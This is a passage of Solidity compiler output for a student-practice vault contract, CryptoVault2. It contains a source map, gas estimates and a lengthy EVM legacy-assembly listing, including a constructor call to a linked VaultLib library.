4;;;;3549:9;3564:10;:15;;3587:6;3564:34;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;3548:50:0;;;3617:4;3609:37;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3374:280;;:::o;741:20::-;;;;;;;;;;;;;:::o;868:25::-;;;;:::o;3136:155:1:-;3194:7;3226:1;3221;:6;;3213:49;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3283:1;3279;:5;3272:12;;3136:155;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "397800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"accounts(address)": "1169",
								"collectedFees()": "1071",
								"deposit()": "42880",
								"owner()": "1097",
								"withdraw(uint256)": "infinite",
								"withdrawAll()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 713,
									"end": 4403,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2005,
									"end": 2012,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2002,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1996,
									"end": 2002,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "PUSH",
									"source": 0,
									"value": "FF"
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "PUSH",
									"source": 0,
									"value": "FF"
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 1996,
									"end": 2012,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2238,
									"name": "PUSHLIB",
									"source": 0,
									"value": "PRACTICA 9/CryptoVault2.sol:VaultLib"
								},
								{
									"begin": 2230,
									"end": 2243,
									"name": "PUSH",
									"source": 0,
									"value": "F09A4016"
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 2244,
									"end": 2249,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 2251,
									"end": 2261,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFF"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "E0"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "SHL",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "4"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP7",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "EXTCODESIZE",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "GAS",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "DELEGATECALL",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 8,
									"end": 17,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "7"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 45,
									"end": 61,
									"name": "RETURNDATASIZE",
									"source": -1
								},
								{
									"begin": 42,
									"end": 43,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 39,
									"end": 40,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 24,
									"end": 62,
									"name": "RETURNDATACOPY",
									"source": -1
								},
								{
									"begin": 77,
									"end": 93,
									"name": "RETURNDATASIZE",
									"source": -1
								},
								{
									"begin": 74,
									"end": 75,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 67,
									"end": 94,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"source": -1,
									"value": "7"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 2230,
									"end": 2262,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1873,
									"end": 2322,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 713,
									"end": 4403,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220a6be3b3699dfb06603382c8589ec425e0d93b25d2dcc434a0d6acd42eb28538564736f6c63430006040033",
									".code": [
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "2E1A7D4D"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "5E5C06E2"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "853828B6"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "9003ADFE"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH",
											"source": 0,
											"value": "D0E30DB0"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4382,
											"end": 4391,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 4382,
											"end": 4389,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 4382,
											"end": 4391,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 4382,
											"end": 4391,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 4382,
											"end": 4391,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 713,
											"end": 4403,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "13"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "15"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 2933,
											"end": 3263,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "17"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 1543,
											"end": 1587,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "19"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
